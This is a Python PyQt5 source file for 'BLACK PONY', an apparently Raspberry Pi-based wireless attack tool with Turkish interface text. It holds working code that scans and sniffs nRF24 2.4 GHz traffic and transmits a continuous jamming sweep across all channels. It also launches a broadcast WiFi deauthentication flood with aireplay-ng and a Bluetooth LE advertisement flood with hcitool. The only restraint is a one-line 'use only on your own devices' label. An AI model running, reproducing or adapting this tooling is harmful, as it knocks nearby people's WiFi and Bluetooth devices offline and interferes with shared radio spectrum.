#!/usr/bin/env python3
# BLACK PONY v5.0
import sys, os, time, random, subprocess
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout,
    QHBoxLayout, QPushButton, QLabel, QTextEdit,
    QStackedWidget, QListWidget, QListWidgetItem, QGridLayout
)
from PyQt5.QtCore  import Qt, QTimer, pyqtSignal, QObject, QThread
from PyQt5.QtGui   import QFont, QColor, QTextCursor

C_BG="#000000"; C_BG2="#0c0c0c"; C_WHITE="#ffffff"
C_LT="#cccccc"; C_MID="#888888"; C_DIM="#444444"; C_DARK="#1a1a1a"

def fnt(sz, bold=False):
    f = QFont("Courier New", sz, QFont.Bold if bold else QFont.Normal)
    f.setStyleHint(QFont.Monospace)
    return f

STYLE = f"""
* {{ background-color:{C_BG}; color:{C_WHITE}; font-family:'Courier New',monospace; border:none; margin:0; padding:0; }}
QTextEdit {{ background-color:{C_BG2}; color:{C_LT}; border:2px solid {C_DIM}; font-size:11px; padding:4px; }}
QListWidget {{ background-color:{C_BG2}; color:{C_LT}; border:2px solid {C_DIM}; font-size:12px; }}
QListWidget::item {{ padding:5px 8px; border-bottom:1px solid {C_DARK}; }}
QListWidget::item:selected {{ background-color:{C_DARK}; color:{C_WHITE}; border-left:3px solid {C_WHITE}; }}
QScrollBar:vertical {{ background:{C_BG}; width:4px; }}
QScrollBar::handle:vertical {{ background:{C_DIM}; }}
"""

class PBtn(QPushButton):
    def __init__(self, txt, h=40, fill=False, small=False):
        super().__init__(txt)
        self.setFixedHeight(h)
        self.setFont(fnt(10 if small else 12, bold=True))
        bg=C_WHITE if fill else C_BG; fg=C_BG if fill else C_WHITE
        hbg=C_LT if fill else C_DARK; hfg=C_BG if fill else C_WHITE
        self.setStyleSheet(f"""
            QPushButton {{ background:{bg}; color:{fg}; border:2px solid {C_WHITE}; letter-spacing:2px; padding:0 8px; }}
            QPushButton:hover {{ background:{hbg}; color:{hfg}; }}
            QPushButton:pressed {{ background:{C_MID}; }}
            QPushButton:disabled {{ background:{C_BG}; color:{C_DIM}; border:2px solid {C_DIM}; }}
        """)

class XBtn(QPushButton):
    def __init__(self, parent=None):
        super().__init__("✕", parent)
        self.setFixedSize(36,36); self.setFont(fnt(13,bold=True))
        self.setCursor(Qt.PointingHandCursor)
        self.setStyleSheet(f"""
            QPushButton {{ background:{C_BG}; color:{C_WHITE}; border:2px solid {C_WHITE}; padding:0; }}
            QPushButton:hover {{ background:{C_WHITE}; color:{C_BG}; }}
            QPushButton:pressed {{ background:{C_MID}; }}
        """)

class HLine(QWidget):
    def __init__(self, thick=2, color=C_WHITE):
        super().__init__(); self.setFixedHeight(thick)
        self.setStyleSheet(f"background:{color};")

class Header(QWidget):
    close_sig = pyqtSignal()
    def __init__(self):
        super().__init__(); self.setFixedHeight(44)
        self.setStyleSheet(f"background:{C_BG2};")
        lay = QHBoxLayout(self); lay.setContentsMargins(0,0,12,0); lay.setSpacing(0)
        x = XBtn(); x.clicked.connect(self.close_sig.emit); lay.addWidget(x)
        lay.addSpacing(8)
        blk = QLabel("■"); blk.setFont(fnt(10,bold=True)); blk.setStyleSheet(f"color:{C_WHITE};")
        nm = QLabel(" BLACK PONY"); nm.setFont(fnt(14,bold=True)); nm.setStyleSheet(f"color:{C_WHITE}; letter-spacing:4px;")
        self.clk = QLabel(); self.clk.setFont(fnt(10)); self.clk.setStyleSheet(f"color:{C_DIM};")
        self.clk.setAlignment(Qt.AlignRight|Qt.AlignVCenter)
        lay.addWidget(blk); lay.addWidget(nm); lay.addStretch(); lay.addWidget(self.clk)
        t = QTimer(self); t.timeout.connect(self._tick); t.start(1000); self._tick()
    def _tick(self): self.clk.setText(datetime.now().strftime("%H:%M:%S"))

class ModCard(QPushButton):
    def __init__(self, name, sub, active=False):
        super().__init__(); self.setFixedSize(210,90)
        self.setEnabled(active); self.setCursor(Qt.PointingHandCursor if active else Qt.ArrowCursor)
        lay = QVBoxLayout(self); lay.setContentsMargins(10,8,10,8); lay.setSpacing(2)
        ico = QLabel("▓▓" if active else "░░"); ico.setFont(fnt(13,bold=True))
        ico.setStyleSheet(f"color:{C_WHITE if active else C_DIM};")
        nm = QLabel(name); nm.setFont(fnt(13,bold=True))
        nm.setStyleSheet(f"color:{C_WHITE}; letter-spacing:3px;" if active else f"color:{C_DIM}; letter-spacing:3px;")
        sb = QLabel(sub); sb.setFont(fnt(9)); sb.setStyleSheet(f"color:{C_MID if active else C_DARK};")
        lay.addWidget(ico); lay.addWidget(nm); lay.addWidget(sb)
        brd = C_WHITE if active else C_DIM
        self.setStyleSheet(f"""
            QPushButton {{ background:{C_BG}; border:2px solid {brd}; }}
            QPushButton:hover {{ background:{C_DARK}; }}
            QPushButton:pressed {{ background:{C_WHITE}; }}
        """)

class LogWidget(QWidget):
    def __init__(self):
        super().__init__()
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(4)
        hdr = QHBoxLayout()
        lbl = QLabel(">> LOG"); lbl.setFont(fnt(10,bold=True)); lbl.setStyleSheet(f"color:{C_MID}; letter-spacing:2px;")
        clr = QPushButton("CLR"); clr.setFixedSize(40,22); clr.setFont(fnt(9))
        clr.setStyleSheet(f"QPushButton {{ background:{C_BG}; color:{C_DIM}; border:1px solid {C_DIM}; }} QPushButton:hover {{ color:{C_WHITE}; border-color:{C_WHITE}; }}")
        hdr.addWidget(lbl); hdr.addStretch(); hdr.addWidget(clr)
        lay.addLayout(hdr)
        self.box = QTextEdit(); self.box.setReadOnly(True); self.box.setFont(fnt(10))
        lay.addWidget(self.box)
        clr.clicked.connect(self.box.clear)
    def emit(self, msg, col=C_LT):
        ts = datetime.now().strftime("%H:%M:%S")
        self.box.append(f'<span style="color:{C_DIM}">[{ts}]</span> <span style="color:{col}">{msg}</span>')
        self.box.moveCursor(QTextCursor.End)

# ── NRF24 DONANIM SINIFI ──────────────────────────
class NRF24HW:
    REG_CONFIG=0x00; REG_STATUS=0x07; REG_RF_CH=0x05
    REG_RF_SETUP=0x06; REG_RPD=0x09; REG_FIFO_STATUS=0x17
    CMD_R_REGISTER=0x00; CMD_W_REGISTER=0x20
    CMD_R_RX_PAYLOAD=0x61; CMD_FLUSH_RX=0xE2; CMD_NOP=0xFF
    CE_PIN=22

    def __init__(self): self.spi=None; self.gpio=None; self.ok=False

    def begin(self):
        try:
            import spidev, RPi.GPIO as GPIO
            self.spi = spidev.SpiDev(); self.spi.open(0,0)
            self.spi.max_speed_hz=4000000; self.spi.mode=0  # 4MHz — daha güvenli
            GPIO.setmode(GPIO.BCM); GPIO.setwarnings(False)
            GPIO.setup(self.CE_PIN, GPIO.OUT); GPIO.output(self.CE_PIN, GPIO.LOW)
            self.gpio = GPIO
            time.sleep(0.1)  # modül power-on süresi

            status = self.read_reg(self.REG_STATUS)
            if status in (0x00, 0xFF):
                self.close(); return False, f"nRF24 yanıt vermedi (STATUS=0x{status:02X}) — GND/VCC kontrol et"

            # Mevcut CONFIG değerini oku, üstüne yaz, doğrula
            current = self.read_reg(self.REG_CONFIG)
            self.write_reg(self.REG_CONFIG, current | 0x02)  # PWR_UP bit set
            time.sleep(0.005)
            cfg = self.read_reg(self.REG_CONFIG)
            if cfg == 0x00 or cfg == 0xFF:
                self.close(); return False, f"Register okunamıyor (0x{cfg:02X})"

            self.ok=True; return True, f"OK — STATUS=0x{status:02X} CONFIG=0x{cfg:02X}"
        except ImportError as e: return False, f"Kütüphane eksik: {e}"
        except Exception as e: return False, f"Hata: {e}"

    def read_reg(self, reg):
        r = self.spi.xfer2([self.CMD_R_REGISTER|(reg&0x1F), self.CMD_NOP]); return r[1]

    def write_reg(self, reg, val):
        self.spi.xfer2([self.CMD_W_REGISTER|(reg&0x1F), val])

    def set_channel(self, ch): self.write_reg(self.REG_RF_CH, ch&0x7F)
    def ce_high(self): self.gpio.output(self.CE_PIN, self.gpio.HIGH)
    def ce_low(self):  self.gpio.output(self.CE_PIN, self.gpio.LOW)

    def rpd(self): return (self.read_reg(self.REG_RPD)&0x01)==1

    def rx_available(self):
        status = self.read_reg(self.REG_STATUS)
        fifo   = self.read_reg(self.REG_FIFO_STATUS)
        return bool(status&0x40) and not bool(fifo&0x01)

    def read_payload(self, length=32):
        r = self.spi.xfer2([self.CMD_R_RX_PAYLOAD]+[self.CMD_NOP]*length)
        self.write_reg(self.REG_STATUS, 0x40); return bytes(r[1:])

    def flush_rx(self): self.spi.xfer2([self.CMD_FLUSH_RX])
    def flush_tx(self): self.spi.xfer2([0xE1])

    def set_rx_mode(self):
        self.ce_low()
        self.write_reg(self.REG_CONFIG,   0x03)
        self.write_reg(self.REG_RF_SETUP, 0x26)
        self.flush_rx(); time.sleep(0.002); self.ce_high(); time.sleep(0.00015)

    def set_tx_mode(self):
        self.ce_low()
        self.write_reg(self.REG_CONFIG,   0x02)
        self.write_reg(self.REG_RF_SETUP, 0x2E)
        self.flush_tx(); time.sleep(0.002)

    def send_payload(self, data):
        self.spi.xfer2([0xA0]+list(data[:32]))
        self.ce_high(); time.sleep(0.000015); self.ce_low()

    def power_down(self):
        self.ce_low(); self.write_reg(self.REG_CONFIG, 0x00)

    def close(self):
        self.ok=False
        try:
            if self.spi: self.power_down(); self.spi.close()
        except: pass
        try:
            if self.gpio: self.gpio.cleanup()
        except: pass

# ── NRF24 WORKER ──────────────────────────────────
class NRF24Worker(QObject):
    log   = pyqtSignal(str, str)
    done  = pyqtSignal()
    found = pyqtSignal(str, int)

    def __init__(self, task): super().__init__(); self.task=task; self._go=True
    def stop(self): self._go=False

    def run(self):
        if   self.task=="scan":  self._scan()
        elif self.task=="sniff": self._sniff()
        elif self.task=="sweep": self._sweep()

    def _hw(self):
        hw = NRF24HW(); ok, msg = hw.begin()
        if not ok:
            self.log.emit(f"! DONANIM HATASI: {msg}", C_DIM)
            return None
        self.log.emit(f"nRF24 {msg}", C_LT); return hw

    def _scan(self):
        self.log.emit("NRF24 SCAN — RPD kanal taraması", C_WHITE)
        hw = self._hw()
        if not hw: self.done.emit(); return
        try:
            hw.set_rx_mode()
            self.log.emit("RX aktif — 126 kanal, 5 tur...", C_MID)
            hits = {}
            for p in range(5):
                if not self._go: break
                self.log.emit(f"Tur {p+1}/5", C_DIM)
                for ch in range(126):
                    if not self._go: break
                    hw.set_channel(ch); hw.ce_high(); time.sleep(0.0002); hw.ce_low()
                    if hw.rpd(): hits[ch] = hits.get(ch,0)+1
                    if hw.rx_available():
                        pkt = hw.read_payload(32)
                        hs  = " ".join(f"{b:02X}" for b in pkt[:8])
                        self.log.emit(f"PKT CH:{ch:03d} {2400+ch}MHz | {hs}..", C_WHITE)
                        self.found.emit(hs[:8], ch)
            self.log.emit("─"*28, C_DIM)
            if hits:
                self.log.emit(f"Aktif kanal: {len(hits)}", C_WHITE)
                for ch,cnt in sorted(hits.items(), key=lambda x:-x[1]):
                    bar="█"*min(cnt,8)+"░"*(8-min(cnt,8))
                    self.log.emit(f"  CH:{ch:03d} {2400+ch}MHz  {bar}  x{cnt}", C_LT)
                    if cnt>=2: self.found.emit(f"CH:{ch:03d}", ch)
            else:
                self.log.emit("Aktif sinyal bulunamadı", C_MID)
        except Exception as e: self.log.emit(f"! {e}", C_DIM)
        finally: hw.close()
        self.log.emit("SCAN TAMAM", C_WHITE); self.done.emit()

    def _sniff(self):
        self.log.emit("NRF24 SNIFF — CRC kapalı promiscuous", C_WHITE)
        hw = self._hw()
        if not hw: self.done.emit(); return
        try:
            hw.set_rx_mode()
            self.log.emit("Paket bekleniyor...", C_LT)
            ch=0; cnt=0; streak=0
            while self._go:
                hw.set_channel(ch); hw.ce_high(); time.sleep(0.001); hw.ce_low()
                if hw.rx_available():
                    pkt=hw.read_payload(32); cnt+=1
                    ts=datetime.now().strftime("%H:%M:%S")
                    hs=" ".join(f"{b:02X}" for b in pkt[:12])
                    self.log.emit(f"[{ts}] #{cnt:04d} CH:{ch:03d} {2400+ch}MHz", C_LT)
                    self.log.emit(f"  {hs}", C_MID)
                    streak=0
                else:
                    streak+=1
                if streak>3: ch=(ch+1)%126; streak=0
        except Exception as e: self.log.emit(f"! {e}", C_DIM)
        finally: hw.close()
        self.log.emit("SNIFF DURDURULDU", C_MID); self.done.emit()

    def _sweep(self):
        self.log.emit("NRF24 SWEEP — PA MAX 2MBPS tüm kanallar", C_WHITE)
        hw = self._hw()
        if not hw: self.done.emit(); return
        try:
            hw.set_tx_mode(); self.log.emit("TX aktif — sweep başlıyor", C_LT)
            payload=bytes([0xFF]*32); ch=0; step=1; cnt=0
            while self._go:
                cnt+=1; hw.set_channel(ch); hw.send_payload(payload)
                ts=datetime.now().strftime("%H:%M:%S")
                bar="█"*(ch//16)+"░"*(8-ch//16)
                self.log.emit(f"[{ts}] #{cnt:04d} CH:{ch:03d} {2400+ch}MHz {bar}", C_LT)
                ch+=step
                if ch>=125: step=-1
                if ch<=0:   step=1
                time.sleep(0.01)
        except Exception as e: self.log.emit(f"! {e}", C_DIM)
        finally: hw.close()
        self.log.emit("SWEEP DURDURULDU", C_MID); self.done.emit()

# ── JAMMER WORKER ──────────────────────────────────
class JammerWorker(QObject):
    log  = pyqtSignal(str, str)
    done = pyqtSignal()
    def __init__(self, task): super().__init__(); self.task=task; self._go=True
    def stop(self): self._go=False
    def run(self):
        if   self.task=="wifi": self._wifi()
        elif self.task=="bt":   self._bt()

    def _wifi(self):
        self.log.emit("WiFi DEAUTH FLOOD", C_WHITE)
        try:
            r = subprocess.run(["iw","dev"], capture_output=True, text=True, timeout=5)
            ifaces = [l.split()[1] for l in r.stdout.splitlines() if "Interface" in l]
            iface  = ifaces[0] if ifaces else None
        except: iface=None
        if not iface:
            self.log.emit("! WiFi arayüzü bulunamadı", C_DIM)
            self.log.emit("USB WiFi adaptörü gerekli", C_MID)
            self.done.emit(); return
        self.log.emit(f"Arayüz: {iface}", C_LT)
        try:
            r = subprocess.run(["sudo","airmon-ng","start",iface], capture_output=True, text=True, timeout=15)
            mon=None
            for line in r.stdout.splitlines():
                if "monitor" in line.lower():
                    for p in line.split():
                        if "mon" in p: mon=p.strip("()[]")
            if not mon: mon=iface+"mon"
            self.log.emit(f"Monitor: {mon}", C_LT)
        except Exception as e:
            self.log.emit(f"! airmon-ng: {e}", C_DIM); self.done.emit(); return
        self.log.emit("Deauth flood başlıyor...", C_WHITE)
        cnt=0
        while self._go:
            cnt+=1; ts=datetime.now().strftime("%H:%M:%S")
            try:
                subprocess.run(["sudo","aireplay-ng","--deauth","0","-a","FF:FF:FF:FF:FF:FF",mon], capture_output=True, timeout=5)
                self.log.emit(f"[{ts}] DEAUTH #{cnt:04d} → broadcast", C_LT)
            except subprocess.TimeoutExpired: pass
            except Exception as e: self.log.emit(f"! {e}", C_DIM); break
        try: subprocess.run(["sudo","airmon-ng","stop",mon], capture_output=True, timeout=10)
        except: pass
        self.log.emit("WiFi DEAUTH DURDURULDU", C_MID); self.done.emit()

    def _bt(self):
        self.log.emit("BT/BLE ADV FLOOD", C_WHITE)
        try:
            r = subprocess.run(["hciconfig"], capture_output=True, text=True, timeout=5)
            if "hci0" not in r.stdout: raise Exception("hci0 bulunamadı")
            subprocess.run(["sudo","hciconfig","hci0","up"], capture_output=True, timeout=5)
            self.log.emit("hci0 aktif", C_LT)
        except Exception as e:
            self.log.emit(f"! {e}", C_DIM)
            self.log.emit("Bluetooth adaptörü gerekli", C_MID)
            self.done.emit(); return
        self.log.emit("BLE advertisement flood...", C_WHITE)
        cnt=0
        while self._go:
            cnt+=1; ts=datetime.now().strftime("%H:%M:%S")
            b=[random.randint(0,255) for _ in range(3)]
            bd=":".join(f"{random.randint(0,255):02X}" for _ in range(6))
            try:
                subprocess.run(["sudo","hcitool","-i","hci0","cmd","0x08","0x0008","1e","02","01","06","1a","ff","4c","00","02","15",f"{b[0]}",f"{b[1]}",f"{b[2]}","00"], capture_output=True, timeout=1)
            except: pass
            self.log.emit(f"[{ts}] ADV #{cnt:04d} {bd}", C_LT)
            time.sleep(0.05)
        self.log.emit("BT FLOOD DURDURULDU", C_MID); self.done.emit()

# ── PAGES ─────────────────────────────────────────
class HomePage(QWidget):
    go_nrf24=pyqtSignal(); go_jammer=pyqtSignal()
    def __init__(self):
        super().__init__()
        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
        lbl=QLabel("> MODUL SEC_"); lbl.setFont(fnt(11)); lbl.setStyleSheet(f"color:{C_DIM};")
        lay.addWidget(lbl); lay.addWidget(HLine(1,C_DIM))
        grid=QGridLayout(); grid.setSpacing(8)
        items=[
            ("NRF24","Scan / Sniff\nSweep",   True, self.go_nrf24.emit),
            ("JAMMER","WiFi / BT\nFlood",      True, self.go_jammer.emit),
            ("GSM","IMSI / SMS",               False,None),
            ("GPS","Konum / Track",            False,None),
            ("GPRS","Data / Network",          False,None),
            ("BLE","Bluetooth LE",             False,None),
        ]
        for i,(n,s,a,fn) in enumerate(items):
            c=ModCard(n,s,a)
            if a and fn: c.clicked.connect(fn)
            grid.addWidget(c,i//2,i%2)
        lay.addLayout(grid); lay.addStretch()
        lay.addWidget(HLine(1,C_DIM))
        st=QLabel("■ NRF24  ■ JAMMER  ░ DIGER MODULLER YAKINDA")
        st.setFont(fnt(9)); st.setStyleSheet(f"color:{C_DIM};"); st.setAlignment(Qt.AlignCenter)
        lay.addWidget(st)

class NRF24Page(QWidget):
    go_home=pyqtSignal()
    def __init__(self):
        super().__init__(); self.worker=self.thread=None
        lay=QVBoxLayout(self); lay.setContentsMargins(10,8,10,8); lay.setSpacing(6)
        top=QHBoxLayout()
        back=PBtn("< GERI",h=34,small=True); back.setFixedWidth(80); back.clicked.connect(self._back)
        ttl=QLabel("NRF24"); ttl.setFont(fnt(16,bold=True)); ttl.setStyleSheet(f"color:{C_WHITE}; letter-spacing:4px;")
        self.dot=QLabel("● HAZIR"); self.dot.setFont(fnt(10)); self.dot.setStyleSheet(f"color:{C_MID};"); self.dot.setAlignment(Qt.AlignRight|Qt.AlignVCenter)
        top.addWidget(back); top.addWidget(ttl); top.addStretch(); top.addWidget(self.dot)
        lay.addLayout(top); lay.addWidget(HLine())
        brow=QHBoxLayout(); brow.setSpacing(6)
        self.bsc=PBtn("SCAN",h=44); self.bsn=PBtn("SNIFF",h=44); self.bsw=PBtn("SWEEP",h=44); self.bst=PBtn("■ STOP",h=44,fill=True)
        self.bst.setEnabled(False)
        self.bsc.clicked.connect(self._scan); self.bsn.clicked.connect(self._sniff)
        self.bsw.clicked.connect(self._sweep); self.bst.clicked.connect(self._stop)
        for b in [self.bsc,self.bsn,self.bsw,self.bst]: brow.addWidget(b)
        lay.addLayout(brow); lay.addWidget(HLine(1,C_DIM))
        hl=QLabel(">> BULUNAN"); hl.setFont(fnt(9,bold=True)); hl.setStyleSheet(f"color:{C_DIM}; letter-spacing:2px;")
        lay.addWidget(hl)
        self.devs=QListWidget(); self.devs.setFixedHeight(120); self.devs.setFont(fnt(11)); lay.addWidget(self.devs)
        self.log=LogWidget(); lay.addWidget(self.log)
        self.log.emit("BLACK PONY v5.0 — nRF24 gerçek mod", C_MID)
        self.log.emit("spidev + RPi.GPIO doğrudan erişim", C_DIM)

    def _e(self,m,c=C_LT): self.log.emit(m,c)
    def _start(self, task):
        if self.thread and self.thread.isRunning(): return
        self.worker=NRF24Worker(task); self.thread=QThread()
        self.worker.moveToThread(self.thread)
        self.worker.log.connect(self._e); self.worker.done.connect(self._done)
        self.worker.found.connect(self._add); self.thread.started.connect(self.worker.run)
        self.thread.start(); self._busy(True)
    def _done(self):
        self._busy(False)
        if self.thread: self.thread.quit(); self.thread.wait()
    def _busy(self,v):
        for b in [self.bsc,self.bsn,self.bsw]: b.setEnabled(not v)
        self.bst.setEnabled(v)
        self.dot.setText("● AKTİF" if v else "● HAZIR")
        self.dot.setStyleSheet(f"color:{C_WHITE};" if v else f"color:{C_MID};")
    def _add(self,addr,ch):
        it=QListWidgetItem(f"  {addr}   CH:{ch:03d}  {2400+ch}MHz")
        it.setForeground(QColor(C_WHITE)); self.devs.addItem(it)
    def _scan(self):
        self.devs.clear(); self._e("─"*30,C_DIM); self._e("[ SCAN ]",C_WHITE); self._start("scan")
    def _sniff(self): self._e("─"*30,C_DIM); self._e("[ SNIFF ]",C_WHITE); self._start("sniff")
    def _sweep(self): self._e("─"*30,C_DIM); self._e("[ SWEEP ]",C_WHITE); self._start("sweep")
    def _stop(self):
        if self.worker: self.worker.stop()
    def _back(self): self._stop(); self.go_home.emit()

class JammerPage(QWidget):
    go_home=pyqtSignal()
    def __init__(self):
        super().__init__(); self.worker=self.thread=None
        lay=QVBoxLayout(self); lay.setContentsMargins(10,8,10,8); lay.setSpacing(6)
        top=QHBoxLayout()
        back=PBtn("< GERI",h=34,small=True); back.setFixedWidth(80); back.clicked.connect(self._back)
        ttl=QLabel("JAMMER"); ttl.setFont(fnt(16,bold=True)); ttl.setStyleSheet(f"color:{C_WHITE}; letter-spacing:4px;")
        self.dot=QLabel("● HAZIR"); self.dot.setFont(fnt(10)); self.dot.setStyleSheet(f"color:{C_MID};"); self.dot.setAlignment(Qt.AlignRight|Qt.AlignVCenter)
        top.addWidget(back); top.addWidget(ttl); top.addStretch(); top.addWidget(self.dot)
        lay.addLayout(top); lay.addWidget(HLine())
        warn=QLabel("! SADECE KENDİ CİHAZLARINDA KULLAN")
        warn.setFont(fnt(10,bold=True)); warn.setStyleSheet(f"color:{C_DIM};"); warn.setAlignment(Qt.AlignCenter)
        lay.addWidget(warn); lay.addWidget(HLine(1,C_DIM))

        def row(lbl_txt, btn_txt, slot):
            r=QHBoxLayout(); r.setSpacing(6)
            l=QLabel(lbl_txt); l.setFont(fnt(12,bold=True)); l.setFixedWidth(60); l.setStyleSheet(f"color:{C_WHITE};")
            b=PBtn(btn_txt,h=44); b.clicked.connect(slot)
            r.addWidget(l); r.addWidget(b); return r,b

        r1,self.bwifi=row("WiFi","DEAUTH FLOOD",self._wifi)
        r2,self.bbt=row("BT/BLE","ADV FLOOD",self._bt)
        lay.addLayout(r1); lay.addLayout(r2)
        self.bst=PBtn("■  STOP",h=44,fill=True); self.bst.setEnabled(False); self.bst.clicked.connect(self._stop)
        lay.addWidget(self.bst); lay.addWidget(HLine(1,C_DIM))
        self.log=LogWidget(); lay.addWidget(self.log)
        self.log.emit("JAMMER hazır", C_MID)
        self.log.emit("WiFi: airmon-ng + aireplay-ng", C_DIM)
        self.log.emit("BT: hcitool hci0", C_DIM)

    def _e(self,m,c=C_LT): self.log.emit(m,c)
    def _start(self, task):
        if self.thread and self.thread.isRunning(): return
        self.worker=JammerWorker(task); self.thread=QThread()
        self.worker.moveToThread(self.thread)
        self.worker.log.connect(self._e); self.worker.done.connect(self._done)
        self.thread.started.connect(self.worker.run)
        self.thread.start(); self._busy(True)
    def _done(self):
        self._busy(False)
        if self.thread: self.thread.quit(); self.thread.wait()
    def _busy(self,v):
        self.bwifi.setEnabled(not v); self.bbt.setEnabled(not v); self.bst.setEnabled(v)
        self.dot.setText("● AKTİF" if v else "● HAZIR")
        self.dot.setStyleSheet(f"color:{C_WHITE};" if v else f"color:{C_MID};")
    def _wifi(self): self._e("─"*30,C_DIM); self._e("[ WiFi DEAUTH ]",C_WHITE); self._start("wifi")
    def _bt(self):   self._e("─"*30,C_DIM); self._e("[ BT/BLE FLOOD ]",C_WHITE); self._start("bt")
    def _stop(self):
        if self.worker: self.worker.stop()
    def _back(self): self._stop(); self.go_home.emit()

class BlackPony(QMainWindow):
    def __init__(self):
        super().__init__(); self.setWindowTitle("BLACK PONY")
        self.setStyleSheet(STYLE); self.showFullScreen()
        root=QWidget(); self.setCentralWidget(root)
        vl=QVBoxLayout(root); vl.setContentsMargins(0,0,0,0); vl.setSpacing(0)
        hdr=Header(); hdr.close_sig.connect(self.close)
        vl.addWidget(hdr); vl.addWidget(HLine())
        self.stack=QStackedWidget()
        self.home=HomePage(); self.nrf=NRF24Page(); self.jammer=JammerPage()
        self.stack.addWidget(self.home)
        self.stack.addWidget(self.nrf)
        self.stack.addWidget(self.jammer)
        self.home.go_nrf24.connect(lambda: self.stack.setCurrentIndex(1))
        self.home.go_jammer.connect(lambda: self.stack.setCurrentIndex(2))
        self.nrf.go_home.connect(lambda: self.stack.setCurrentIndex(0))
        self.jammer.go_home.connect(lambda: self.stack.setCurrentIndex(0))
        vl.addWidget(self.stack)
    def keyPressEvent(self,e):
        if e.key()==Qt.Key_Escape: self.close()

if __name__=="__main__":
    app=QApplication(sys.argv); app.setApplicationName("Black Pony")
    w=BlackPony(); sys.exit(app.exec_())
